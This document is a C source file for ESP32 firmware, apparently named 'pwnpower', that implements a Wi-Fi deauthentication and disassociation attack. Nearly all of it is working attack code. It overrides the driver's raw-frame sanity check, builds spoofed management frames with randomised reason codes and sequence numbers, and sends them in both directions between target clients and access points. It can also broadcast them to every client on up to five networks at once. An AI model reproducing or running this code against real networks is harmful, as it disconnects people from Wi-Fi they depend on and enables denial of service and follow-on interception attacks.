#include "esp_wifi.h"
#include "wifi_scan.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_err.h"
#include "cJSON.h"
#include <string.h>
#include "esp_system.h"
#include "esp_random.h"

#define TAG "DEAUTH"
#define MAX_PPS 500 // packets per second
#define MAX_ACTIVE_ATTACKS 5
void wifi_deauth_task(void *param);

int ieee80211_raw_frame_sanity_check(const void *frame, int len) {
    return 0;
}

static const uint8_t deauth_packet_template[26] = { 
    0xC0, 0x00, 0x3A, 0x01,             // frame control + duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // bssid
    0x00, 0x00,                         // sequence
    0x07, 0x00                          // reason code 7
};

// 0xA0 type = management disassoc frame
static const uint8_t disassoc_packet_template[26] = {
    0xA0, 0x00,             // frame control (type/subtype)
    0x3A, 0x01,             // duration 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // target MAC
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // spoofed AP MAC
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (same as AP)
    0x00, 0x00,             // sequence
    0x07, 0x00              // reason code (7 = leaving)
};

static uint32_t last_sent = 0;
extern const uint8_t dual_band_channels[];
extern const size_t dual_band_channels_size;
// static uint16_t ap_count = 0;
// static wifi_ap_record_t *scanned_aps = NULL;
TaskHandle_t deauth_task_handle = NULL;
volatile bool deauth_active = false;

typedef struct {
    uint8_t bssid[6];
    uint8_t target_sta[6];
    int channel;
    bool active;
    bool is_broadcast;
} active_attack_t;

static active_attack_t active_attacks[MAX_ACTIVE_ATTACKS];
SemaphoreHandle_t attack_mutex = NULL;

static uint32_t deauth_count = 0;
static uint32_t disassoc_count = 0;
// static uint32_t last_logged_count = 0;

static bool check_packet_rate() {
    uint32_t now = esp_log_timestamp(); // use actual ms instead of ticks
    if((now - last_sent) < (1000/MAX_PPS)) return false;
    last_sent = now;
    return true;
}

esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t *target_sta) {
    ESP_LOGD(TAG, "Broadcasting deauth on channel %d to BSSID %02X:%02X:%02X:%02X:%02X:%02X", 
            channel, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    
    if(channel < 1 || channel > 196) {  // max supported channel
        ESP_LOGE(TAG, "invalid channel %d - pwnpower supports 1-196", channel);
        return ESP_ERR_INVALID_ARG;
    }
    
    // just set channel, no mode changes needed since we're already in ap mode
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "failed to set channel %d: %s", channel, esp_err_to_name(err));
        return err;
    }

    uint8_t deauth_frame[26];
    // alternate frame types
    const uint8_t *frame_template = (esp_random() % 2) ? deauth_packet_template : disassoc_packet_template;
    memcpy(deauth_frame, frame_template, 26);

    static const uint8_t effective_reasons[] = {
        2,  // Previous authentication no longer valid
        7,  // Class 3 frame received from nonassociated STA  
        14, // Message integrity code (MIC) failure
        15, // Authentication expired (requires complete new auth)
        16, // Group key handshake timeout
        23  // IEEE 802.1X authentication failed 
    };
    deauth_frame[24] = effective_reasons[esp_random() % 6];  // cycle through effective reasons
    deauth_frame[25] = 0x00;

    // randomize sequence control
    uint16_t seq = esp_random() & 0xFFF;
    deauth_frame[22] = (seq >> 4) & 0xFF;  // upper 8 bits of sequence number
    deauth_frame[23] = ((seq << 4) & 0xF0) | (0 << 0);  // lower 4 bits + fragment number (0)

    // Track whether we've sent a packet to rate limit
    bool sent_packet = false;
    
    if(target_sta) {
        // DIRECTION 1: AP → Client
        // - destination = client MAC (target)
        // - source = AP MAC (BSSID)
        // - BSSID = AP MAC (BSSID)
        memcpy(&deauth_frame[4], target_sta, 6);  // destination = client
        memcpy(&deauth_frame[10], bssid, 6);      // source = AP
        memcpy(&deauth_frame[16], bssid, 6);      // BSSID = AP
        
        // Add extra debug logging to verify frame construction
        ESP_LOGI(TAG, "Targeting client %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X", 
                target_sta[0], target_sta[1], target_sta[2],
                target_sta[3], target_sta[4], target_sta[5],
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                
        // Send Direction 1 frame
        if(check_packet_rate()) {
            sent_packet = true;
            if(frame_template == deauth_packet_template) {
                deauth_count++;
                ESP_LOGI(TAG, "deauth(D1) %lu to client %02X:%02X:%02X:%02X:%02X:%02X seq=%d", 
                        deauth_count, target_sta[0], target_sta[1], target_sta[2],
                        target_sta[3], target_sta[4], target_sta[5], seq);
            } else {
                disassoc_count++;
                ESP_LOGI(TAG, "disassoc(D1) %lu to client %02X:%02X:%02X:%02X:%02X:%02X reason=%d", 
                        disassoc_count, target_sta[0], target_sta[1], target_sta[2],
                        target_sta[3], target_sta[4], target_sta[5], deauth_frame[24]);
            }
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            
            // Small delay between frames
            vTaskDelay(pdMS_TO_TICKS(2));
        }
        
        // DIRECTION 2: Client → AP
        // - destination = AP MAC (BSSID)
        // - source = client MAC (target)
        // - BSSID = AP MAC (same)
        memcpy(&deauth_frame[4], bssid, 6);       // destination = AP
        memcpy(&deauth_frame[10], target_sta, 6); // source = client
        memcpy(&deauth_frame[16], bssid, 6);      // BSSID = AP (unchanged)
        
        // Update sequence for direction 2
        seq = esp_random() & 0xFFF;
        deauth_frame[22] = (seq >> 4) & 0xFF;
        deauth_frame[23] = ((seq << 4) & 0xF0) | (0 << 0);
        
        // Send Direction 2 frame - spoofed as coming from client
        if(check_packet_rate()) {
            sent_packet = true;
            if(frame_template == deauth_packet_template) {
                deauth_count++;
                ESP_LOGI(TAG, "deauth(D2) %lu from client %02X:%02X:%02X:%02X:%02X:%02X to AP seq=%d", 
                        deauth_count, target_sta[0], target_sta[1], target_sta[2],
                        target_sta[3], target_sta[4], target_sta[5], seq);
            } else {
                disassoc_count++;
                ESP_LOGI(TAG, "disassoc(D2) %lu from client %02X:%02X:%02X:%02X:%02X:%02X reason=%d", 
                        disassoc_count, target_sta[0], target_sta[1], target_sta[2],
                        target_sta[3], target_sta[4], target_sta[5], deauth_frame[24]);
            }
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        }
    } else {
        // Broadcast deauth - only one direction needed
        // - destination = broadcast
        // - source = AP MAC (BSSID)
        // - BSSID = AP MAC
        memcpy(&deauth_frame[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        memcpy(&deauth_frame[10], bssid, 6);
        memcpy(&deauth_frame[16], bssid, 6);
        
        // Send broadcast frame
        if(check_packet_rate()) {
            sent_packet = true;
            if(frame_template == deauth_packet_template) {
                deauth_count++;
                ESP_LOGI(TAG, "broadcast deauth %lu from %02X:%02X:%02X:%02X:%02X:%02X seq=%d", 
                        deauth_count, bssid[0], bssid[1], bssid[2], bssid[3],
                        bssid[4], bssid[5], seq);
            } else {
                disassoc_count++;
                ESP_LOGI(TAG, "broadcast disassoc %lu from %02X:%02X:%02X:%02X:%02X:%02X reason=%d", 
                        disassoc_count, bssid[0], bssid[1], bssid[2], bssid[3],
                        bssid[4], bssid[5], deauth_frame[24]);
            }
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        }
    }
    
    if(!sent_packet) {
        ESP_LOGV(TAG, "rate limited, skipping packet");
    }
    
    return ESP_OK;
}

void wifi_manager_start_deauth(uint8_t bssid[6], int channel, uint8_t *station_mac) {
    ESP_LOGI(TAG, "Starting deauth attack on BSSID %02X:%02X:%02X:%02X:%02X:%02X (ch%d)",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);

    // Skip if trying to deauth the AP itself (invalid)
    if (station_mac && memcmp(station_mac, bssid, 6) == 0) {
        ESP_LOGW(TAG, "Ignoring attempt to deauth AP itself - this is invalid");
        return;
    }

    if (station_mac) {
        ESP_LOGI(TAG, "Client target: %02X:%02X:%02X:%02X:%02X:%02X", 
                 station_mac[0], station_mac[1], station_mac[2], 
                 station_mac[3], station_mac[4], station_mac[5]);
    } else {
        ESP_LOGI(TAG, "Broadcast deauth (all clients)");
    }

    // Create mutex if it doesn't exist yet
    if(attack_mutex == NULL) {
        attack_mutex = xSemaphoreCreateMutex();
        if(attack_mutex == NULL) {
            ESP_LOGE(TAG, "Failed to create attack mutex!");
            return;
        }
    }

    xSemaphoreTake(attack_mutex, portMAX_DELAY);
    
    // Find existing or empty slot
    for(int i=0; i<MAX_ACTIVE_ATTACKS; i++) {
        // Check for an empty slot or a slot with the same attack parameters
        bool slot_match = false;
        
        // Empty slot
        if (!active_attacks[i].active) {
            slot_match = true;
        }
        // Exact match (same BSSID and same target type - broadcast or same client)
        else if (memcmp(active_attacks[i].bssid, bssid, 6) == 0) {
            // For broadcast attacks
            if (station_mac == NULL && active_attacks[i].is_broadcast) {
                slot_match = true;
            }
            // For targeted attacks - same client
            else if (station_mac != NULL && !active_attacks[i].is_broadcast && 
                    memcmp(active_attacks[i].target_sta, station_mac, 6) == 0) {
                slot_match = true;
            }
        }
        
        if (slot_match) {
            // Found a suitable slot, set it up
            memcpy(active_attacks[i].bssid, bssid, 6);
            if (station_mac) {
                memcpy(active_attacks[i].target_sta, station_mac, 6);
            } else {
                memset(active_attacks[i].target_sta, 0, 6);
            }
            active_attacks[i].channel = channel;
            active_attacks[i].active = true;
            active_attacks[i].is_broadcast = (station_mac == NULL);
            ESP_LOGI(TAG, "Added attack to slot %d, is_broadcast=%d", i, active_attacks[i].is_broadcast);
            break;
        }
        
        // If we've checked all slots and found no match, skip this attack if all slots are full
        if (i == MAX_ACTIVE_ATTACKS - 1) {
            ESP_LOGW(TAG, "All attack slots are full, skipping this attack");
        }
    }
    
    // Start task if not already running
    if(deauth_task_handle == NULL) {
        ESP_LOGI(TAG, "Starting deauth task");
        deauth_active = true;  // Set this BEFORE creating task
        xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
    }
    
    xSemaphoreGive(attack_mutex);
}

void wifi_manager_stop_deauth(uint8_t bssid[6]) {
    ESP_LOGI(TAG, "Stopping deauth attack on BSSID %02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

    xSemaphoreTake(attack_mutex, portMAX_DELAY);
    
    for(int i=0; i<MAX_ACTIVE_ATTACKS; i++) {
        if(memcmp(active_attacks[i].bssid, bssid, 6) == 0) {
            active_attacks[i].active = false;
            memset(active_attacks[i].bssid, 0, 6);
            ESP_LOGI(TAG, "Removed attack from slot %d", i);
            break;
        }
    }

    // Check if all attacks stopped
    bool any_active = false;
    for(int i=0; i<MAX_ACTIVE_ATTACKS; i++) {
        if(active_attacks[i].active) {
            any_active = true;
            break;
        }
    }
    
    if(!any_active && deauth_task_handle != NULL) {
        ESP_LOGI(TAG, "No active attacks, stopping deauth task");
        deauth_active = false;  // Set this while still holding mutex
        vTaskDelete(deauth_task_handle);
        deauth_task_handle = NULL;
    }
    
    xSemaphoreGive(attack_mutex);
}

void wifi_deauth_task(void *param) {
    ESP_LOGI(TAG, "Deauth task started");
    
    // store original mode and get home channel
    wifi_mode_t original_mode;
    esp_wifi_get_mode(&original_mode);
    wifi_config_t ap_config;
    esp_wifi_get_config(WIFI_IF_AP, &ap_config);
    uint8_t original_max_conn = ap_config.ap.max_connection;
    
    // disable new connections during deauth
    ap_config.ap.max_connection = 0;  
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    uint8_t home_channel = ap_config.ap.channel;
    uint32_t start_time = xTaskGetTickCount();

    // proper full wifi shutdown
    esp_wifi_disconnect();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(200));  // increased delay to ensure proper shutdown

    // set pure ap mode - this is critical for deauth to work properly
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(200));  // increased delay to ensure AP is fully started
    
    ESP_LOGI(TAG, "switched to pure ap mode for deauth attacks");

    // add watchdog feed counter
    uint32_t packet_count = 0;
    const uint32_t YIELD_EVERY = 50; // yield every 50 packets

    while(deauth_active) {
        // check 30-second timeout - use milliseconds for more precise timing
        uint32_t elapsed_ms = (xTaskGetTickCount() - start_time) * portTICK_PERIOD_MS;
        if (elapsed_ms >= 30000) {
            ESP_LOGI(TAG, "30-second timeout reached, stopping deauth");
            deauth_active = false;
            break;
        }

        xSemaphoreTake(attack_mutex, portMAX_DELAY);
        
        // process all active attacks
        for(int i=0; i<MAX_ACTIVE_ATTACKS; i++) {
            if(active_attacks[i].active) {
                ESP_LOGD(TAG, "processing attack slot %d on channel %d", i, active_attacks[i].channel);
                
                // set channel with error handling
                esp_err_t err = esp_wifi_set_channel(active_attacks[i].channel, WIFI_SECOND_CHAN_NONE);
                if (err != ESP_OK) {
                    ESP_LOGE(TAG, "Failed to set channel %d: %s", active_attacks[i].channel, esp_err_to_name(err));
                    // skip this iteration if we can't set the channel
                    continue;
                }
                
                // small delay after channel change to stabilize
                vTaskDelay(pdMS_TO_TICKS(5));
                
                if(memcmp(active_attacks[i].target_sta, "\x00\x00\x00\x00\x00\x00", 6) != 0) {
                    // TARGETED STA DEAUTH
                    ESP_LOGI(TAG, "Sending targeted deauth to client %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X",
                        active_attacks[i].target_sta[0], active_attacks[i].target_sta[1], active_attacks[i].target_sta[2],
                        active_attacks[i].target_sta[3], active_attacks[i].target_sta[4], active_attacks[i].target_sta[5],
                        active_attacks[i].bssid[0], active_attacks[i].bssid[1], active_attacks[i].bssid[2],
                        active_attacks[i].bssid[3], active_attacks[i].bssid[4], active_attacks[i].bssid[5]);
                        
                    wifi_manager_broadcast_deauth(
                        active_attacks[i].bssid,
                        active_attacks[i].channel,
                        active_attacks[i].target_sta
                    );
                }
                if(active_attacks[i].is_broadcast) {
                    // BROADCAST DEAUTH
                    wifi_manager_broadcast_deauth(
                        active_attacks[i].bssid,
                        active_attacks[i].channel,
                        NULL
                    );
                }
                
                // increment packet counter and check for yield
                packet_count++;
                if(packet_count % YIELD_EVERY == 0) {
                    xSemaphoreGive(attack_mutex);
                    // give other tasks (especially IDLE) some time
                    vTaskDelay(pdMS_TO_TICKS(5));  // increased from 1ms
                    xSemaphoreTake(attack_mutex, portMAX_DELAY);
                }
            }
        }

        xSemaphoreGive(attack_mutex);
        
        // increased delay between rounds and explicit yield
        vTaskDelay(pdMS_TO_TICKS(20));  // increased from 10ms
        taskYIELD();  // explicit yield to other tasks
    }

    // proper cleanup at end
    esp_wifi_disconnect();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(200));  // increased delay for proper shutdown

    // restore original config
    esp_wifi_set_mode(original_mode);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(200));  // increased delay for proper startup
    
    // restore channel
    esp_wifi_set_channel(home_channel, WIFI_SECOND_CHAN_NONE);
    
    // clean up
    xSemaphoreTake(attack_mutex, portMAX_DELAY);
    for(int i=0; i<MAX_ACTIVE_ATTACKS; i++) {
        active_attacks[i].active = false;
        memset(active_attacks[i].bssid, 0, 6);
        memset(active_attacks[i].target_sta, 0, 6);
    }
    deauth_task_handle = NULL;
    xSemaphoreGive(attack_mutex);

    // restore original AP config
    ap_config.ap.max_connection = original_max_conn;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    ESP_LOGI(TAG, "Deauth task stopped");
    vTaskDelete(NULL);
}

void get_deauth_stats(uint32_t *deauth, uint32_t *disassoc) {
    xSemaphoreTake(attack_mutex, portMAX_DELAY);
    *deauth = deauth_count;
    *disassoc = disassoc_count;
    xSemaphoreGive(attack_mutex);
} 